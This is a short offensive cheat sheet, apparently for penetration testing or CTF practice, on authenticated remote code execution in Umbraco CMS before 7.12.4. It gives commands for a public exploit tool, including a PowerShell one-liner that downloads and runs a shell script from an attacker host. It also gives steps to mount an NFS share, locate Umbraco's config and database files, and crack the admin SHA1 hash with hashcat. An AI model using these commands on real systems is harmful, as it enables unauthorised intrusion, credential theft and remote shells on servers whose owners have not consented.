# Umbraco CMS Authenticated RCE

Authenticated Umbraco administrators can execute arbitrary commands via XSLT template processing.

## Admin Login Page
```
http://<TARGET>/Umbraco
```

## Exploit (Python PoC)
```python
# After authenticating, exploit via XSLT template
# Tool: https://github.com/noraj/Umbraco-RCE
python exploit.py -u admin@<domain> -p <password> -i http://<TARGET> -c whoami
python exploit.py -u admin@<domain> -p <password> -i http://<TARGET> -c powershell -a "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
```

## Hash in NFS / Config File
Umbraco stores admin hash in `Umbraco.sdf` (SQL CE database) or `Web.config`:
```bash
# Mount NFS share, find config
mount -t nfs <TARGET>:/<share> /mnt/nfs
find /mnt/nfs -name "*.sdf" -o -name "Web.config" 2>/dev/null
# Extract SHA1 hash, crack with hashcat mode 100
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

## Notes
- Default admin login at `/Umbraco` 
- Hash format: `SHA1(<salt><password>)` — mode 100 in hashcat
- Versions before 7.12.4 vulnerable
